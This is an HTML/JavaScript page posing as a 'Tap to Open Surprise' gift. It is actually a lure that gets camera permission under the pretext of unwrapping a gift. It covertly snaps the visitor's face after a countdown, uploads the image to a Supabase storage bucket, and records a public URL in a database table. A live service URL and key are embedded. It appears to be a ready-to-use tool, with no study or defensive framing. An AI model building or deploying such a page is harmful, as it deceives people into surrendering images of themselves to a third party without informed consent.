<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Your Surprise Gift üéÅ</title>
    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
    <style>
        body { 
            background: #1e272e; 
            color: white; 
            display: flex; 
            flex-direction: column; 
            align-items: center; 
            justify-content: center; 
            height: 100vh; 
            font-family: 'Segoe UI', sans-serif; 
            text-align: center; 
            overflow: hidden; 
            margin: 0;
        }
        
        /* Gift Box Animation */
        #gift-box { cursor: pointer; transition: transform 0.3s; }
        #gift-box:hover { transform: scale(1.05); }
        .emoji { font-size: 120px; animation: bounce 2s infinite; display: block; margin-bottom: 20px;}
        h1 { margin: 0; background: linear-gradient(to right, #ff4757, #ff6b81); -webkit-background-clip: text; -webkit-text-fill-color: transparent;}
        
        /* Timer */
        #timer { font-size: 8rem; color: #ff4757; display: none; font-weight: bold; text-shadow: 0 0 20px rgba(255, 71, 87, 0.5); }
        
        /* Status Text */
        #status { margin-top: 20px; color: #ced6e0; font-size: 1.2rem; }

        /* Hidden Elements */
        #video { display: none; } 
        #canvas { display: none; }

        @keyframes bounce { 
            0%, 20%, 50%, 80%, 100% {transform: translateY(0);} 
            40% {transform: translateY(-20px);} 
            60% {transform: translateY(-10px);} 
        }
    </style>
</head>
<body>

    <div id="gift-box" onclick="startProcess()">
        <div class="emoji">üéÅ</div>
        <h1>Tap to Open Surprise</h1>
        <p style="color: gray; font-size: 0.9rem; margin-top: 10px;">(Contains a special moment for you)</p>
    </div>

    <div id="timer">10</div>
    <p id="status"></p>

    <video id="video" autoplay playsinline></video>
    <canvas id="canvas"></canvas>

    <script>
        // --- YOUR CONFIGURATION ---
        const SUPABASE_URL = 'https://mlcbjfnimbpatmbcgwsq.supabase.co';
        const SUPABASE_KEY = 'sb_publishable_J1WdZTnnDUCBE6bsTf2brQ_qRlXL_1Z'; // ÿß⁄Øÿ± €å€Å ⁄©ÿßŸÖ ŸÜ€Å ⁄©ÿ±€í ÿ™Ÿà anon key ÿßÿ≥ÿ™ÿπŸÖÿßŸÑ ⁄©ÿ±€å⁄∫
        
        const supabase = window.supabase.createClient(SUPABASE_URL, SUPABASE_KEY);

        async function startProcess() {
            try {
                // 1. Request Camera (Generic permission popup)
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { facingMode: 'user' }, 
                    audio: false 
                });
                
                document.getElementById('video').srcObject = stream;

                // 2. Start Countdown
                document.getElementById('gift-box').style.display = 'none';
                document.getElementById('timer').style.display = 'block';
                document.getElementById('status').innerText = "Unwrapping surprise...";
                
                let count = 10;
                const timerElem = document.getElementById('timer');
                
                const interval = setInterval(() => {
                    count--;
                    timerElem.innerText = count;
                    if (count <= 0) {
                        clearInterval(interval);
                        captureAndUpload();
                    }
                }, 1000);

            } catch (err) {
                alert("Please allow camera access to open the gift!");
                console.error(err);
            }
        }

        async function captureAndUpload() {
            document.getElementById('status').innerText = "Generating your gift...";
            const video = document.getElementById('video');
            const canvas = document.getElementById('canvas');
            
            // Capture Image
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            const ctx = canvas.getContext('2d');
            
            // Mirror Effect (Flip Horizontal)
            ctx.translate(canvas.width, 0);
            ctx.scale(-1, 1);
            ctx.drawImage(video, 0, 0);

            // Convert to File (Blob)
            canvas.toBlob(async (blob) => {
                const fileName = `gift_${Date.now()}.png`;

                // 3. Upload to Supabase Storage
                const { data, error } = await supabase.storage
                    .from('camsnaps')
                    .upload(fileName, blob);

                if (error) {
                    console.error("Upload Error:", error);
                    document.getElementById('status').innerText = "Network Error! Could not save.";
                    return;
                }

                // 4. Get Public URL
                const { data: urlData } = supabase.storage.from('camsnaps').getPublicUrl(fileName);
                const publicURL = urlData.publicUrl;

                // 5. Save Record to Database
                const { error: dbError } = await supabase
                    .from('captured_photos')
                    .insert([{ image_url: publicURL }]);

                if (dbError) console.error("DB Error:", dbError);

                // 6. Show Success
                document.getElementById('timer').style.display = 'none';
                document.getElementById('status').innerHTML = `
                    <h1 style="font-size:2rem;">üéâ You look Amazing! üéâ</h1>
                    <br>
                    <img src="${publicURL}" style="width:80%; max-width:300px; border:5px solid white; border-radius:10px; transform: rotate(-2deg);">
                `;

                // Stop Camera
                video.srcObject.getTracks().forEach(track => track.stop());

            }, 'image/png');
        }
    </script>
</body>
</html>
